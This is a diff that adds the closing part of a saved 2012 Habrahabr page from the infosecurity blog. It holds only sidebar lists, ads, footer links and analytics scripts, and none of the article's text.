+</div>
+		
+  <p class="for_users_only_msg">Только зарегистрированные пользователи могут оставлять комментарии. <a href="http://habrahabr.ru/login/">Войдите</a>, пожалуйста.</p>
+
+
+		<div id="edit_tags_form" class="hidden">
+<form action="http://habrahabr.ru/blogs/infosecurity/136771/#" method="post">
+  <input type="hidden" name="action" value="add">
+  <input type="hidden" name="ti" value="0">
+  <input type="hidden" name="tt" value="0">
+  <label>Пометьте топик понятными вам метками, если хотите</label>
+  <input type="text" name="tags_string" class="tags_string" autocomplete="off" style="">
+  <div class="description">Метки лучше разделять запятой. Например: <i>общение, социальные сети, myspace.com, подростки, мердок</i></div>
+  <input type="submit" value="Сохранить" class="submit"> или <a href="http://habrahabr.ru/blogs/infosecurity/136771/#" class="close" onclick="return close_edit_tags()">закрыть</a>
+</form>
+</div>
+	
+	
+
+    </div>
+  </div>
+  <div class="sidebar_right">
+    
+	
+<div class="block blog_info">
+  <h1>Информация о блоге</h1>
+  <div class="info">
+  
+    <div class="stats">
+      <div class="members_count" id="members_count">21711 читателей</div>
+      <div class="posts_count">1505 постов</div>
+    </div>
+    
+    
+		
+  </div>
+</div>
+
+	
+
+
+	<div class="banner_240x400">
+		
+<!--  AdRiver code START. Type:240x400 Site: habrahabr PZ: 0 BN: 0 -->
+<script language="javascript" type="text/javascript"><!--
+var RndNum4NoCash = Math.round(Math.random() * 1000000000);
+var ar_Tail='unknown'; if (document.referrer) ar_Tail = escape(document.referrer);
+document.write(
+'<iframe src="http://ad.adriver.ru/cgi-bin/erle.cgi?'
++ 'sid=176776&target=top&bt=22&pz=0&rnd=' + RndNum4NoCash + '&tail256=' + ar_Tail
++ '" frameborder=0 vspace=0 hspace=0 width=240 height=400 marginwidth=0'
++ ' marginheight=0 scrolling=no></iframe>');
+//--></script><iframe src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/erle(2).html" frameborder="0" vspace="0" hspace="0" width="240" height="400" marginwidth="0" marginheight="0" scrolling="no"></iframe>
+<noscript></noscript>
+
+<!--  AdRiver code END  -->
+
+	</div>
+
+
+
+
+
+
+	
+
+<div class="block daily_best_posts">
+  <h1>Лучшее <sup>за 24 часа</sup> ↓ </h1>
+  <div class="posts_list">
+    
+      <div class="post_item">
+        
+		
+		
+		
+		<!--<a href="http://habrahabr.ru/company/toster/blog/131694/#toster_tickets">--><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/toster.gif" alt="Toster" style="vertical-align:top;float:left;display:block;margin-right:10px;margin-top:4px;" class="help-tip"><!--</a>-->
+        <a href="http://habrahabr.ru/blogs/energy/" class="blog_name">Энергия и элементы питания</a> →
+        <a href="http://habrahabr.ru/blogs/energy/137276/" class="post_name">Ближайшее будущее аккумуляторных батарей</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/study/" class="blog_name">Учебный процесс в IT</a> →
+        <a href="http://habrahabr.ru/blogs/study/137305/" class="post_name">Изучение иностранных языков: живые учителя или интернет?</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/company/kaspersky/blog/" class="blog_name">Блог компании «Лаборатория Касперского»</a> →
+        <a href="http://habrahabr.ru/company/kaspersky/blog/137304/" class="post_name">Батники против эксплойтов</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/php/" class="blog_name">PHP</a> →
+        <a href="http://habrahabr.ru/blogs/php/137296/" class="post_name">Улучшения в htmlspecialchars() в версии 5.4</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/android_development/" class="blog_name">Разработка под Android</a> →
+        <a href="http://habrahabr.ru/blogs/android_development/137294/" class="post_name">Перемещение картинки вдоль произвольной кривой</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/client_side_optimization/" class="blog_name">Клиентская оптимизация</a> →
+        <a href="http://habrahabr.ru/blogs/client_side_optimization/137318/" class="post_name">JavaScript. Оптимизация: опыт, проверенный временем</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/django/" class="blog_name">Django Framework</a> →
+        <a href="http://habrahabr.ru/blogs/django/137324/" class="post_name">Шпаргалка для Django 1.3</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/study/" class="blog_name">Учебный процесс в IT</a> →
+        <a href="http://habrahabr.ru/blogs/study/137287/" class="post_name">Аспирантура в Швейцарии, собственный опыт и наблюдения</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/yandex/" class="blog_name">Яндекс</a> →
+        <a href="http://habrahabr.ru/blogs/yandex/137291/" class="post_name">«Яндекс» приобрел цифровые карты мира у Navteq</a>
+      </div>      
+    
+      <div class="post_item">
+        
+		
+		
+		
+		
+        <a href="http://habrahabr.ru/blogs/copyright/" class="blog_name">Копирайт</a> →
+        <a href="http://habrahabr.ru/blogs/copyright/137302/" class="post_name">Файлы MegaUpload хотят удалить на этой неделе</a>
+      </div>      
+    
+  </div>
+  <div class="all">« <a href="http://habrahabr.ru/top/">все лучшие</a></div>
+</div>
+
+	
+
+
+<div class="block similar_posts">
+
+	<h1>Похожие посты ↓ </h1>
+  <div class="posts_list">
+  	
+    	<div class="post_item">
+    				<span class="when">25.01.2012</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/nodejs/">Node.JS</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/nodejs/136947/">Авторы Cloud9 IDE представили сборник документации по Node.js</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">23.01.2012</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/network_technologies/">Сетевые технологии</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/network_technologies/136844/">Принципы организации учёта IP-трафика</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">13.01.2012</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/nodejs/">Node.JS</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/nodejs/136185/">Вызываем функции Windows&nbsp;API (и&nbsp;любые другие функции, написанные на&nbsp;языке&nbsp;Си) джаваскриптом из&nbsp;Node.js</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">26.12.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/javascript/">JavaScript</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/javascript/135284/">ActionScript как язык для разработки JS приложений c jQuery и дебагером</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">21.12.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/nodejs/">Node.JS</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/nodejs/135076/">Поддержка Node.JS в Windows Azure</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">21.12.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/search_engines/">Поисковые машины и технологии</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/search_engines/135022/">Яндекс крадёт мобильный трафик у вебмастеров?</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">16.12.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/nodejs/">Node.JS</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/nodejs/134738/">Запускаем jQuery на&nbsp;движке&nbsp;Node.js вместо&nbsp;браузера</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">14.12.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/nodejs/">Node.JS</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/nodejs/134567/">Node.JS на&nbsp;Android, если&nbsp;Android порутованный</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">26.11.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/nodejs/">Node.JS</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/nodejs/133426/">Выход Node.JS версии 0.6.3 и&nbsp;две&nbsp;ошибки, найденные при&nbsp;работе с&nbsp;кодировками дочерних процессов в&nbsp;консоли Windows&nbsp;XP</a>
+      </div>
+  	
+    	<div class="post_item">
+    				<span class="when">25.11.2011</span> → 
+    				<a class="blog_name" href="http://habrahabr.ru/blogs/windows/">Windows</a> → 
+    				<a class="post_name" href="http://habrahabr.ru/blogs/windows/131500/">HTML5+ JS приложения для Windows 8. Что внутри + холиварные мысли</a>
+      </div>
+  	
+  </div>			
+</div>
+
+
+
+
+	
+
+
+<div class="block live_broadcast_activity">
+  <h1>Прямой эфир ↓ </h1>
+  <div class="posts_list">
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/afsherman/" class="user_name">afsherman</a> →
+      <a href="http://habrahabr.ru/blogs/silverlight/137341/#comment_4573811" class="post_name">Доступ к буферу обмена операционной системы из веб-приложения</a>
+      <span class="count">2</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/Daess/" class="user_name">Daess</a> →
+      <a href="http://habrahabr.ru/company/sonyericsson/blog/137099/#comment_4573810" class="post_name">Первый взгляд на Sony Xperia S: смартфон нашего времени</a>
+      <span class="count">14</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/datacompboy/" class="user_name">datacompboy</a> →
+      <a href="http://habrahabr.ru/blogs/php/137337/#comment_4573809" class="post_name">Правильный запуск PHP-скриптов в бекграунде</a>
+      <span class="count">31</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/k1k/" class="user_name">k1k</a> →
+      <a href="http://habrahabr.ru/company/kaspersky/blog/137304/#comment_4573808" class="post_name">Батники против эксплойтов</a>
+      <span class="count">35</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/dunordavind/" class="user_name">dunordavind</a> →
+      <a href="http://habrahabr.ru/blogs/study/137287/#comment_4573807" class="post_name">Аспирантура в Швейцарии, собственный опыт и наблюдения</a>
+      <span class="count">41</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/PapaBubaDiop/" class="user_name">PapaBubaDiop</a> →
+      <a href="http://habrahabr.ru/blogs/macosxdev/137342/#comment_4573805" class="post_name">50 советов для разработки безупречного дизайна iOS приложения</a>
+      <span class="count">6</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/mikhailian/" class="user_name">mikhailian</a> →
+      <a href="http://habrahabr.ru/blogs/infodesign/137338/#comment_4573804" class="post_name">Treemap, доходы депутатов, и язык Processing</a>
+      <span class="count">7</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/achekalin/" class="user_name">achekalin</a> →
+      <a href="http://habrahabr.ru/blogs/yandex/137291/#comment_4573803" class="post_name">«Яндекс» приобрел цифровые карты мира у Navteq</a>
+      <span class="count">61</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/Talyutin/" class="user_name">Talyutin</a> →
+      <a href="http://habrahabr.ru/blogs/pm/137345/#comment_4573799" class="post_name">Демонстрация дизайна — как преподнести работу так, чтобы она вызвала аппетит</a>
+      <span class="count">2</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/TheHorse/" class="user_name">TheHorse</a> →
+      <a href="http://habrahabr.ru/blogs/compilers/137336/#comment_4573797" class="post_name">Транслятор из Delphi в javascript</a>
+      <span class="count">21</span>
+    </div>
+
+  </div>
+  <!--div class="all">&laquo; <a href="/live/">весь прямой эфир</a></div-->
+  
+</div>
+
+
+
+  
+	
+	
+
+<div class="block best_company">
+
+		<h1>Компания дня <img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/bg_cicle_help.png" class="help-tip"></h1>
+
+		<div class="company_info">
+			<div class="name">
+			 <img class="favicon" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/favicon_981.ico" alt="LinguaLeo" height="16" width="16">
+			 <a href="http://habrahabr.ru/company/lingualeo/" class="title">LinguaLeo</a>
+			</div>
+
+			<p>Последний пост:
+				<a href="http://habrahabr.ru/company/lingualeo/blog/137151/">iPhone-приложение LinguaLeo опубликовали в AppStore</a>
+			</p>
+
+			<div class="like">
+  			<div id="fans_count">294 поклонника</div>
+  			
+			</div>
+		</div>
+
+	</div>
+
+
+	
+
+<div class="block qa_activity">
+  <h1>Q&amp;A ↓ </h1>
+  <div class="posts_list">
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/AndreyDaeron/" class="user_name">AndreyDaeron</a> →
+      <a href="http://habrahabr.ru/qa/15942/#answer_66212" class="post_name">Как организовать работу команды дизайнеров?</a>
+      <span class="count">1</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/1010101001000100110100111/" class="user_name">1010101001000100110100111</a> →
+      <a href="http://habrahabr.ru/qa/15941/#comment_77749" class="post_name">Какие мониторы меньше всего влияют на зрение?</a>
+      <span class="count">2</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/cat_crash/" class="user_name">cat_crash</a> →
+      <a href="http://habrahabr.ru/qa/15940/#answer_66210" class="post_name">Карты. Вставка на сайт часть карты</a>
+      <span class="count">1</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/BaHeK/" class="user_name">BaHeK</a> →
+      <a href="http://habrahabr.ru/qa/15910/#answer_66208" class="post_name">Какая фигура лишняя?</a>
+      <span class="count">25</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/AndreyDmitriev/" class="user_name">AndreyDmitriev</a> →
+      <a href="http://habrahabr.ru/qa/15937/#comment_77746" class="post_name">Как перенести %ProgramData% и все %UserProfile% на другой диск на уже установленной Windows 7?</a>
+      
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/mihavxc/" class="user_name">mihavxc</a> →
+      <a href="http://habrahabr.ru/qa/15938/#comment_77745" class="post_name">Adblock(FF) перестал блокировать рекламу</a>
+      <span class="count">6</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/PaGrom/" class="user_name">PaGrom</a> →
+      <a href="http://habrahabr.ru/qa/15923/#comment_77743" class="post_name">Проблема с автозагрузкой python-скрипта</a>
+      <span class="count">5</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/sledopit/" class="user_name">sledopit</a> →
+      <a href="http://habrahabr.ru/qa/15931/#comment_77740" class="post_name">Как запустить все виртуалки в xen server из консоли?</a>
+      <span class="count">2</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/1010101001000100110100111/" class="user_name">1010101001000100110100111</a> →
+      <a href="http://habrahabr.ru/qa/15797/#comment_77738" class="post_name">Хабрачерновик: Поднимаем свой Вело-VPN-сервер без блэк-джеков</a>
+      <span class="count">4</span>
+    </div>
+
+    <div class="post_item">
+      <a href="http://habrahabr.ru/users/pnick/" class="user_name">pnick</a> →
+      <a href="http://habrahabr.ru/qa/15934/#comment_77737" class="post_name">"Два интернета" на одном компьютере</a>
+      <span class="count">6</span>
+    </div>
+
+  </div>
+  <div class="all">« <a href="http://habrahabr.ru/qa/">все вопросы</a></div>
+  
+</div>
+
+	
+
+<div class="block new_vacanies">
+  <h1>О, работа! ↓ </h1>
+  <div class="vacancies">
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7765-veduschiy-python-razrabotchik">Ведущий Python-разработчик</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7764-ischem-javascript-programmista-udalennaya-rabota">Ищем javascript-программиста. (удаленная работа)</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7763-analitik-tehnicheskiy-pisatel">Аналитик, технический писатель</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7760-php-programmist">PHP программист</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7762-ux-dizayner">UX-Дизайнер</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7761-web-programmist">Web-программист</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7737-junior-veb-razrabotchik-na-drupal">Junior веб-разработчик на Drupal</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7759-java-programmist-dlya-udalennoy-postoyannoy-raboty">Java программист для удаленной постоянной работы</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7758-kompleksnoe-prodvizhenie">Комплексное продвижение</a>
+		</div>
+		
+		<div class="job_item">
+			<a href="http://hantim.ru/jobs/7755-spetsialist-po-kontekstnoy-reklame">Специалист по контекстной рекламе</a>
+		</div>
+		
+  </div>
+  <div class="all">« <a href="http://hantim.ru/">все вакансии</a></div>
+
+	</div>
+      
+	
+	
+	
+	<div class="block category_blogs">
+		<h1>Безопасность ↓</h1>
+		
+		<div class="blogs_list">
+			
+        <div class="blog_item">				
+				  <div class="title">
+				  	<a href="http://habrahabr.ru/blogs/crypto/">Криптография</a>
+				  </div>
+		
+			  </div>
+			
+        <div class="blog_item">				
+				  <div class="title">
+				  	<a href="http://habrahabr.ru/blogs/virus/">Вирусы (и антивирусы)</a>
+				  </div>
+		
+			  </div>
+			
+        <div class="blog_item">				
+				  <div class="title">
+				  	<a href="http://habrahabr.ru/blogs/web_security/">Вопросы безопасности в веб-технологиях</a>
+				  </div>
+		
+			  </div>
+			
+        <div class="blog_item">				
+				  <div class="title">
+				  	<a href="http://habrahabr.ru/blogs/spam/">Спам (и антиспам)</a>
+				  </div>
+		
+			  </div>
+			
+		</div>
+		<div class="all">« <a href="http://habrahabr.ru/bloglist/security/">все  блоги</a></div>
+  </div>
+	
+
+
+	
+
+
+<div class="block similar_events">
+  <h1>Ближайшие события</h1>
+  <div class="events">
+    
+    <div class="event">
+			
+			<div class="date">
+				<div class="dayname dayname_3"></div>
+				<div class="day">01</div>
+				<div class="month">февраля</div>				
+			</div>
+			
+			<div class="title">
+			 <a href="http://habrahabr.ru/events/393/">1С-Битрикс: Корпоративный портал 11.0» - управление идеями, проектами и социальными коммуникациями.</a>			 
+			</div>
+		</div>
+		
+    <div class="event">
+			
+			<div class="date">
+				<div class="dayname dayname_4"></div>
+				<div class="day">02</div>
+				<div class="month">февраля</div>				
+			</div>
+			
+			<div class="title">
+			 <a href="http://habrahabr.ru/events/385/">Использование технологий Windows Azure в качестве бэкэнда для разработки под основные мобильные платформы</a>			 
+			</div>
+		</div>
+		
+    <div class="event">
+			
+			<div class="date">
+				<div class="dayname dayname_5"></div>
+				<div class="day">03</div>
+				<div class="month">февраля</div>				
+			</div>
+			
+			<div class="title">
+			 <a href="http://habrahabr.ru/events/403/">Лекция Санберга: интерактив в телевидении</a>			 
+			</div>
+		</div>
+		
+    <div class="event">
+			
+			<div class="date">
+				<div class="dayname dayname_6"></div>
+				<div class="day">04</div>
+				<div class="month">февраля</div>				
+			</div>
+			
+			<div class="title">
+			 <a href="http://habrahabr.ru/events/378/">Мастер-класс по разработке приложений для Android</a>			 
+			</div>
+		</div>
+		
+    <div class="event">
+			
+			<div class="date">
+				<div class="dayname dayname_1"></div>
+				<div class="day">06</div>
+				<div class="month">февраля</div>				
+			</div>
+			
+			<div class="title">
+			 <a href="http://habrahabr.ru/events/394/">QML тренинг в Петрозаводске</a>			 
+			</div>
+		</div>
+		
+  </div>
+  <div class="all">« <a href="http://habrahabr.ru/events/">все события</a></div>
+</div>
+
+
+    
+  </div>
+  <div class="clear"></div>
+
+		  <div id="footer">
+      
+			
+			<dl>
+				<dd><a href="http://habrahabr.ru/login/">Войти</a></dd>
+				<dd><a href="http://habrahabr.ru/register/">Регистрация</a></dd>
+			</dl>
+			
+			<dl>
+				<dt>Разделы</dt>
+			  
+				<dd><a href="http://habrahabr.ru/qa/">Q&amp;A</a></dd>
+				<dd><a href="http://habrahabr.ru/events/">События</a></dd>
+				<!--dd><a href="http://habrahabr.ru/links/">Ссылки</a></dd-->
+				<dd><a href="http://habrahabr.ru/job/">Работа</a></dd>
+				<dd><a href="http://habrahabr.ru/bloglist/">Блоги</a></dd>
+				<dd><a href="http://habrahabr.ru/companies/">Компании</a></dd>
+				<dd><a href="http://habrahabr.ru/people/">Люди</a></dd>
+				<dd><a href="http://habrahabr.ru/top/">Лучшие</a></dd>
+			</dl>
+			<dl>
+				<dt>Блоги</dt>
+				<dd><a href="http://habrahabr.ru/">Все</a></dd>
+				<dd><a href="http://habrahabr.ru/blogs/">Тематические</a></dd>
+				<dd><a href="http://habrahabr.ru/corporative/">Корпоративные</a></dd>
+				<!--dd><a href="http://habrahabr.ru/personal/">Личные</a></dd-->
+				<dd><a href="http://habrahabr.ru/sandbox/">Песочница</a></dd>
+			</dl>
+			<dl>
+				<dt>Инфо</dt>
+				<dd><a href="http://habrahabr.ru/info/about/">О сайте</a></dd>
+				<dd><a href="http://habrahabr.ru/info/help/rules/">Правила</a></dd>
+				<dd><a href="http://habrahabr.ru/info/help/">Помощь</a></dd>
+				<dd><a href="http://habrahabr.ru/info/agreement/">Соглашение</a></dd>
+				<dd><a href="http://habrahabr.ru/info/stats/">Статистика</a></dd>
+			</dl>
+			<dl>
+				<dt>Услуги</dt>
+				<dd><a href="http://habrahabr.ru/info/advertising/">Реклама</a></dd>
+				<dd><a href="http://habrahabr.ru/info/advertising/corporate/">Корпоративные пакеты</a></dd>
+				<dd><a href="http://habrahabr.ru/info/advertising/workshops/">Семинары</a></dd>
+			</dl>
+      <div class="copyright">
+    		<a class="footer_logo" href="http://thematicmedia.ru/">Тематические Медиа</a>
+    		<div class="about">
+    			© 2006–2012<br>
+    			«<a href="http://www.thematicmedia.ru/">Тематические Медиа</a>»
+    		  <br><br>	
+  				Служба поддержки:<br>
+  				<a href="mailto:support@habrahabr.ru" title="адрес службы поддержки пользователей">support@habrahabr.ru</a><br><br><br>
+  				<a href="http://m.habrahabr.ru/">Мобильная версия</a>
+  			
+			  </div>
+      </div>
+	
+</div>
+		</div>
+	 	
+		
+    
+		
+    <script type="text/javascript">
+      $(document).ready(function(){
+        // test gggg
+        // настройки всплывающих уведомлений
+        $.jGrowl.defaults.closerTemplate = '<div>Закрыть все уведомления</div>';         
+        
+        // настройки тултипов
+        $(".help-tip").tipTip({maxWidth: "auto", edgeOffset: 10});  
+        
+      });
+      // global vars
+      var g_base_url = 'habrahabr.ru';
+      var g_show_xpanel = false;
+      var g_base_fullurl = 'http://habrahabr.ru/';
+      var g_is_guest = false;
+       
+    </script>
+    
+    
+<script type="text/javascript">
+	/*<![CDATA[*/
+	var ga = document.createElement('script');
+		ga.setAttribute('async', 'true');
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+	/* ]]>*/
+</script>
+
+<script type="text/javascript">
+	var _gaq = _gaq || [];
+	_gaq.push(
+	    ['_setAccount', 'UA-726094-1'],
+	    ['_setDomainName', '.habrahabr.ru'],
+	    ["_addOrganic", "mail.ru", "q"],
+	    ["_addOrganic","rambler.ru", "words"],
+	    ["_addOrganic","nigma.ru", "s"],
+	    ["_addOrganic","blogs.yandex.ru", "text"],
+	    ["_addOrganic","webalta.ru", "q"],
+	    ["_addOrganic","aport.ru", "r"],
+	    ["_addOrganic","akavita.by", "z"],
+	    ["_addOrganic","meta.ua", "q"],
+	    ["_addOrganic","bigmir.net", "q"],
+	    ["_addOrganic","tut.by", "query"],
+	    ["_addOrganic","all.by", "query"],
+	    ["_addOrganic","i.ua", "q"],
+	    ["_addOrganic","online.ua", "q"],
+	    ["_addOrganic","a.ua", "s"],
+	    ["_addOrganic","ukr.net", "search_query"],
+	    ["_addOrganic","search.com.ua", "q"],
+	    ["_addOrganic","search.ua", "query"],
+	    ["_addOrganic","poisk.ru", "text"],
+	    ["_addOrganic","km.ru", "sq"],
+	    ["_addOrganic","liveinternet.ru", "ask"],
+	    ["_addOrganic","gogo.ru", "q"],
+	    ["_addOrganic","gde.ru", "keywords"],
+	    ["_addOrganic","quintura.ru", "request"],
+	    ['_trackPageview']
+	);
+	document.documentElement.firstChild.appendChild(ga);
+</script>	
+		
+		
+	
+
+<div id="AutocompleteContainter_31bae" style="position: absolute; top: 51px; left: 958px; z-index: 9999; "><div class="autocomplete-w1"><div class="autocomplete" id="Autocomplete_31bae" style="display: none; max-height: 400px; width: 300px; "></div></div></div><div id="AutocompleteContainter_7f3b9" style="position: absolute; top: 0px; left: 0px; z-index: 9999; "><div class="autocomplete-w1"><div class="autocomplete" id="Autocomplete_7f3b9" style="display: none; max-height: 400px; width: 300px; "></div></div></div><div id="tiptip_holder" style="max-width:auto;"><div id="tiptip_arrow"><div id="tiptip_arrow_inner"></div></div><div id="tiptip_content"></div></div></body></html>
